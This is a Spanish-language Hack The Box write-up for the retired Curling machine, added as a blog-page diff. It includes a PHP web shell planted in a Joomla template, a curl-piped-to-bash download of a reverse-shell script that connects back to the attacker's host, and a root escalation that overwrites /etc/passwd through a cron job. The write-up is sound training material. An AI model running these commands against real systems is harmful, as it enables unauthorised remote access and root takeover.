@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Retirada Curling de Hack The Box (Necesario VIP) | Blog de Hacking</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Maquina Retirada Curling de Hack The Box (Necesario VIP)" />
+<meta name="author" content="K0Hack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CURLING" />
+<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CURLING" />
+<link rel="canonical" href="http://localhost:4000/2021/05/21/Curling-Joomla-CURL.html" />
+<meta property="og:url" content="http://localhost:4000/2021/05/21/Curling-Joomla-CURL.html" />
+<meta property="og:site_name" content="Blog de Hacking" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-21T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Maquina Retirada Curling de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"K0Hack"},"dateModified":"2021-05-21T00:00:00-03:00","datePublished":"2021-05-21T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CURLING","headline":"Maquina Retirada Curling de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/05/21/Curling-Joomla-CURL.html"},"url":"http://localhost:4000/2021/05/21/Curling-Joomla-CURL.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Blog de Hacking" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Blog de Hacking<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Blog Personal de K0Hack sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Maquina  Retirada Curling de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/Joomla,/">Joomla,</a>
+      
+      <a class="tag" href="/tag/CURL,/">CURL,</a>
+      
+      <a class="tag" href="/tag/Web/">Web</a>
+      
+      <a class="tag" href="/tag/Hacking,/">Hacking,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
+      
+      <a class="tag" href="/tag/Writeup/">Writeup</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 21 May 2021</div>
+  
+  <noscript>
+    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CURLING</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="curling--hack-the-box">Curling ~ Hack The Box</h1>
+
+<p>Realizamos el Primer escaneo con Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.150       "</span>
+</code></pre></div></div>
+<p>Procedemos con el siguiente escaneo de Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -sC -sV -p -oN target 10.10.10.150  
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
+|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
+|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></div>
+<p>Procedemos a hacer un pequeño Fuzzing con nmap y el script <code class="language-plaintext highlighter-rouge">http-enum</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nmap --script http-enum -p80 10.10.10.150 -oN Webscan</span>
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 17:25 CEST
+Nmap scan report <span class="k">for </span>10.10.10.150
+Host is up <span class="o">(</span>0.041s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /administrator/: Possible admin folder
+|   /administrator/index.php: Possible admin folder
+|   /administrator/manifests/files/joomla.xml: Joomla version 3.8.8
+|   /language/en-GB/en-GB.xml: Joomla version 3.8.8
+|   /htaccess.txt: Joomla!
+|   /README.txt: Interesting, a readme.
+|   /bin/: Potentially interesting folder
+|   /cache/: Potentially interesting folder
+|   /images/: Potentially interesting folder
+|   /includes/: Potentially interesting folder
+|   /libraries/: Potentially interesting folder
+|   /modules/: Potentially interesting folder
+|   /templates/: Potentially interesting folder
+|_  /tmp/: Potentially interesting folder
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>8.07 seconds
+</code></pre></div></div>
+<p>Procedemos a hecharle un vistazo a la pagina web
+<em>foto</em>
+Vemos varios comentarios y enumeramos un posible usuario llamado <code class="language-plaintext highlighter-rouge">"Floris"</code></p>
+
+<p>Hacemos #Ctrl+U para inspeccionar el codigo fuente</p>
+
+<p>Nos encontramos al final del codigo fuente de la pagina principal un comentario con un <code class="language-plaintext highlighter-rouge">secret.txt</code></p>
+
+<p>Procedemos con: <code class="language-plaintext highlighter-rouge">"http://10.10.10.150/secret.txt"</code></p>
+
+<p>Encontramos un hash: <code class="language-plaintext highlighter-rouge">Q3VybGluZzIwMTgh</code> que parece estar codificado en <code class="language-plaintext highlighter-rouge">base64</code></p>
+
+<p>Hacemos un tratamiento de la posible pass encontrada:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># echo "Q3VybGluZzIwMTgh" | base64 -d       </span>
+Curling2018!
+</code></pre></div></div>
+
+<p>Seguimos comprobando las rutas que nos a enumerado el script de nmap: <code class="language-plaintext highlighter-rouge">"/administrator/"</code>
+Encontramos el Panel Login.
+Tenemos:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User: Floris
+Pass: Curling2018!
+</code></pre></div></div>
+<p>Nos conseguimos loguear correctamente como el user Floris
+Una vez dentro nos dirigimos a <code class="language-plaintext highlighter-rouge">TEMPLATES</code>, elegimos el tema <code class="language-plaintext highlighter-rouge">Beez3</code> y procedemos a crear un nuevo archivo.
+<a href="https://ibb.co/9cqRCyv"><img src="https://i.ibb.co/wBKDxpL/curling-joomla-template-malicius.png" alt="curling-joomla-template-malicius.png" border="0" /></a></p>
+
+<p>El archivo que vamos a crear va a ser una archivo malicioso <code class="language-plaintext highlighter-rouge">.php</code>tal que podamos ejecutar comandos a a nivel web para posteriormente lanzarnos una shell
+Archivito del Joomla: Nombre: <code class="language-plaintext highlighter-rouge">pros.php</code></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+    <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Ahora a nivel web vamos a intentar apuntar a nuestro archivo template creado nuevo: <code class="language-plaintext highlighter-rouge">/templates/beez3/pros.php</code>
+Vemos que nos responde y se esta interpretando, procedemos a ejecutar comandos de la siguiente forma:
+<em>foto</em></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="s2">"http://10.10.10.150/templates/beez3/pros.php?cmd=whoami"</span>
+www-data
+</code></pre></div></div>
+<p>Probamos con las revershell de siempre y vemos que no conseguimos acceso a la maquina.
+La Alternativa esta en el uso de CURL para hacer una peticion a un servidor que nos montemos con python3, compartiendo un archivo shell.sh para apunte a nuestro servidor con una Revese_shell:
+Archivo <code class="language-plaintext highlighter-rouge">Shell.sh</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.5/443
+</code></pre></div></div>
+<p>Teniendo el servidor <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code> montado alojando el recurso <code class="language-plaintext highlighter-rouge">Shell.sh</code>
+Procedemos a hacer la Peticion Web:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="s2">"http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.14.5/Shell.sh"</span>
+</code></pre></div></div>
+<p>Como output: Vemos que se nos lee el codigo tipo:
+<code class="language-plaintext highlighter-rouge">#!/bin/bash bash -i &gt;&amp; /dev/tcp/10.10.14.5/443 0&gt;&amp;1 </code></p>
+
+<p>Nos preparamos y nos ponemos a la escucha con <code class="language-plaintext highlighter-rouge">nc -vnlp 443</code> para recibir la shell.
+Ahora paso clave: Pipearlo con <code class="language-plaintext highlighter-rouge">BASH</code>
+Para lograr que se ejecute ahora el codigo:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="s2">"http://10.10.10.150/templates/beez3/pros.php?cmd=curl%20http//10.10.14.5/Shell.sh|bash"</span>
+</code></pre></div></div>
+<p>Y de este modo conseguimos nuestra consola como <code class="language-plaintext highlighter-rouge">www-data</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc -vlnp 443 </span>
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.150] 47316
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1335<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@curling:/var/www/html/templates/beez3<span class="nv">$ </span><span class="nb">whoami
+</span>www-data
+</code></pre></div></div>
+<p>Hacemos un tratamiento de la tty para poder movernos adecuadamente:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/<span class="nv">$ </span><span class="s2">"script /dev/null -c bash"</span>
+script /dev/null <span class="nt">-c</span> bash
+Script started, file is /dev/null
+www-data@curling:/<span class="nv">$ </span><span class="s2">"^Z"</span>        <span class="c">#Ctrl+z</span>
+zsh: suspended  nc <span class="nt">-vlnp</span> 443
+                                                                                                                                                           
+┌──<span class="o">(</span>root💀K0<span class="o">)</span>-[/home/…/HTB/Curling/content]
+└─# <span class="s2">"stty raw -echo;fg  "</span>                                                                                                                          148 ⨯ 1 ⚙
+<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443
+                              <span class="s2">"reset"</span>
+reset: unknown terminal <span class="nb">type </span>unknown
+Terminal <span class="nb">type</span>? <span class="s2">"xterm"</span>
+www-data@curling:/<span class="nv">$ </span><span class="s2">"export TERM=xterm"</span>
+www-data@curling:/<span class="nv">$ </span><span class="s2">"export SHELL=bash"</span>
+www-data@curling:/<span class="nv">$ </span>
+</code></pre></div></div>
+<p>Nos movemos a la carpeta <code class="language-plaintext highlighter-rouge">/home/floris</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> floris/
+total 12
+drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
+<span class="nt">-rw-r--r--</span> 1 floris floris 1076 May 22  2018 password_backup
+<span class="nt">-rw-r-----</span> 1 floris floris   33 May 22  2018 user.txt
+</code></pre></div></div>
+<p>Vemos que tenemos 1 directorio y dos archivos, del cual nosotros como <code class="language-plaintext highlighter-rouge">www-data</code> solo podemos leer el password_backup:</p>
+<pre><code class="language-hex">www-data@curling:/home/floris$ cat password_backup 
+00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&amp;SY...H..
+00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
+00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
+00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
+00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
+00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
+00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
+00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..&lt;~.x
+00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .&gt;...sVT.zH....1
+00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
+000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
+000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
+000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
+000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
+000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
+000000f0: 819b bb48                                ...H
+</code></pre>
+<p>Vemos que es un archivo en <code class="language-plaintext highlighter-rouge">HEXADECIMAL</code> probamos a reversearlo con el commando <code class="language-plaintext highlighter-rouge">xxd -r password_backup</code> y almacenarlo en <code class="language-plaintext highlighter-rouge">/tmp/password-backup</code> usar el comando <code class="language-plaintext highlighter-rouge">file</code> para ver que tipo de archivo es:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/home/floris<span class="nv">$ </span>xxd <span class="nt">-r</span> password_backup <span class="o">&gt;</span> /tmp/password_backup 
+www-data@curling:/home/floris<span class="nv">$ </span>file /tmp/password_backup 
+<span class="s2">"/tmp/password_backup: bzip2 compressed data, block size = 900k    "</span>
+</code></pre></div></div>
+<p>Ahora nos vamos a compartir el archivo con un servidor que nos montamos desde la maquina victima para poder descargarnos el recurso alojado en <code class="language-plaintext highlighter-rouge">/tmp/password_backup</code>: (“Situado en la ruta /tmp/”)</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">8000</span>
+</code></pre></div></div>
+<p>Usamos el comando: <code class="language-plaintext highlighter-rouge">wget http://10.10.10.150:8000/password_backup</code>
+Procedemos a descomprimir el archivos unas 4 o 5 veces haciendo uso de: <code class="language-plaintext highlighter-rouge">$ 7z x password_backup</code> multiples veces hasta que
+obtenemos el ultimo fichero que se llama <code class="language-plaintext highlighter-rouge">"password.txt"</code> y almacena:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat password.txt    </span>
+5d&lt;wdCbdZu<span class="o">)</span>|hChXll
+</code></pre></div></div>
+<p>Posible contraseña del user Floris:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/<span class="nv">$ </span>su floris
+Password: 5d&lt;wdCbdZu<span class="o">)</span>|hChXll
+floris@curling:/<span class="nv">$ </span>
+</code></pre></div></div>
+<p>Apartir de aqui ya podriamos visualizar la flag <code class="language-plaintext highlighter-rouge">user.txt</code> localizada en <code class="language-plaintext highlighter-rouge">/home/floris/user.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>floris@curling:/home<span class="nv">$ </span><span class="nb">cat </span>floris/user.txt 
+65dd1df0713b40d88ead98cf1......
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios-al-user-root">Escalada de Privilegios al user Root</h1>
+
+<p>Vemos que tenemos un directorio en la carpeta /home/floris/admin-area</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>floris@curling:~/admin-area<span class="nv">$ </span><span class="nb">ls
+</span>input  report
+floris@curling:~/admin-area<span class="nv">$ </span><span class="nb">cat </span>input 
+url <span class="o">=</span> <span class="s2">"http://127.0.0.1"</span>
+</code></pre></div></div>
+<p>Vemos que el fichero input almacena una url, probamos a montarnos un servidor con python3 y cambiar la url del archiv <code class="language-plaintext highlighter-rouge">input</code>por la de nuestro servidor
+a ver si recibimos una peticion a nivel web.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python3 -m http.server 80</span>
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.150 - - <span class="o">[</span>21/May/2021 16:44:01] code 404, message File not found
+10.10.10.150 - - <span class="o">[</span>21/May/2021 16:44:01] <span class="s2">"GET /prueba HTTP/1.1"</span> 404 -
+</code></pre></div></div>
+<p>Comprobamos que hay una tarea CRON por detras que posiblemente sea del user Root que nos la esta ejecutando el archivo input.</p>
+
+<p>Vale pues llegados a este punto nosotros podriamos copiarnos el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> del user <code class="language-plaintext highlighter-rouge">floris</code>, para crearnos una contraseña en formato Unix para ponerla en el archivo nuevo de <code class="language-plaintext highlighter-rouge">passwd</code> que nos vamos a crear para posteriormente atraves del archivo <code class="language-plaintext highlighter-rouge">input</code> modificarlo y hacer que nos lo guarde en su propio <code class="language-plaintext highlighter-rouge">/etc/paswd</code>a nivel de root con la contraseña que le hallamos puesto.</p>
+
+<p>Paso 1.- Copiarse el /etc/pàsswd de floris</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+floris:x:1000:1004:floris:/home/floris:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre></div></div>
+<p>Paso 2.- Crearnos una contraseña para el user Root y pegarla en el nuevo <code class="language-plaintext highlighter-rouge">passwd</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># openssl passwd</span>
+Password: hola
+Verifying - Password: hola
+kuaLSx9HZad7.
+</code></pre></div></div>
+<p>Pegandola en el archivo <code class="language-plaintext highlighter-rouge">passwd</code> en nuestra maquina, para el user <code class="language-plaintext highlighter-rouge">root</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:kuaLSx9HZad7.:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+floris:x:1000:1004:floris:/home/floris:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre></div></div>
+<p>Modificamos el archivo <code class="language-plaintext highlighter-rouge">input</code> para que nos lance la peticion a nuestro servidor y sobrescriba el fichero<code class="language-plaintext highlighter-rouge">/etc/passwd</code> del user <code class="language-plaintext highlighter-rouge">root</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url <span class="o">=</span> <span class="s2">"http://10.10.16.132/passwd"</span>
+output <span class="o">=</span> <span class="s2">"/etc/passwd"</span>
+</code></pre></div></div>
+
+<p>Vale teniendo nuestro ficherito ya listo para compartirlo, nos montamos el servidor con python3</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python3 -m http.server 80</span>
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.150 - - <span class="o">[</span>21/May/2021 17:04:02] <span class="s2">"GET /passwd HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+<p>Ahi nos lo hace y comprobamos el fichero /etc/passwd, a ver si se a sobrescrito correctamente con la pass indicada para el user  <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>floris@curling:~/admin-area<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+root:kuaLSx9HZad7.:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+floris:x:1000:1004:floris:/home/floris:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+floris@curling:~/admin-area<span class="nv">$ </span>
+</code></pre></div></div>
+<p>Y vemos que si, asique porque no vamos a pasarnos al user root:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>floris@curling:~/admin-area<span class="nv">$ </span>su root
+Password: 
+root@curling:/home/floris/admin-area#
+</code></pre></div></div>
+<p>Y ya procederiamos a ver la flag de <code class="language-plaintext highlighter-rouge">root/root.txt</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@curling:/home/floris/admin-area# <span class="nb">cat</span> /root/root.txt 
+82c198ab6fc5365fdc6da2ee.....
+</code></pre></div></div>
+
+<p>!! Conseguido !! Maquina Rooteada !! :)</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2021/05/21/Curling-Joomla-CURL.html';
+     this.page.identifier = '/2021/05/21/Curling-Joomla-CURL';
+     this.page.title = 'Maquina  Retirada Curling de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/06/27/Trick.html">
+            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/15/Attacktive-Directory.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
